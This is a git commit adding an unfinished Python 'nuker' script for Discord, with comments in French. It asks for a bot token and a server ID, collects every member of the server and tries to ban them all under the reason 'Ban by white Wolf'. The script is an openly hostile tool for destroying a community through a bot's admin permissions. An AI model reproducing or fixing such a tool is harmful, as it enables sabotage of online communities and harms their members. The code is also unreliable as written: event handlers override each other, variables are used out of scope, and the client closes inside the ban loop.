d99b1bef8607e9872d8dc7b4006756e7c794aa2a
Xql.dev <205849173+KirobotDev@users.noreply.github.com>
2026-06-08 00:09:19 +0700

    Add nukerdiscord is not finish

---
+++ code/nukerdiscord.py
@@ -0,0 +1,80 @@
+# Is not finish and not testing sory my account discord is Rate Limiting juste waiting my unrate and testing nuker :)
+
+# ANCHOR - White WOLF :)
+
+
+import os
+import time
+import random
+import requests
+import discord
+
+def nuker():
+    red = "\033[31m"
+    green = "\033[32m"
+    yellow = "\033[33m"
+    blue = "\033[34m"
+    white = "\033[37m"
+    reset = "\033[0m"
+
+    os.system("cls")
+    token = input(f"""{blue}
+            ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
+            ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
+            ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
+            ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
+            ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
+            ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
+            
+            Met le token de ton bot : """)
+
+    os.system("cls")
+    server_id = input(f"""{blue}
+            ██╗██████╗ 
+            ██║██╔══██╗
+            ██║██║  ██║
+            ██║██║  ██║
+            ██║██████╔╝
+            ╚═╝╚═════╝ 
+            
+            Met l'id du server : """)
+
+    TOKEN = token
+    GUILD_ID = server_id
+
+    intents = discord.Intents.default()
+    intents.members = True
+
+    client = discord.Client(intents=intents)
+
+    @client.event
+    async def on_ready():
+        print(f"Connecté en tant que {client.user}")
+
+        guild = client.get_guild(GUILD_ID)
+
+        member_ids = []
+
+        for member in guild.members:
+            member_ids.append(member.id)
+        
+        print(member_ids)
+
+        await client.close()
+
+    @client.event
+    async def on_ready():
+        for user_id in member_ids:
+            try:
+                user = await client.fetch_user(user_id)
+                await guild.ban(user, reason="Ban by white Wolf")
+                print(f"Banni : {user}")
+            except Exception as e:
+                print(f"Error {e}")
+            
+            await client.close()
+
+    client.run(TOKEN)
+
+if __name__ == "__main__":
+    nuker()
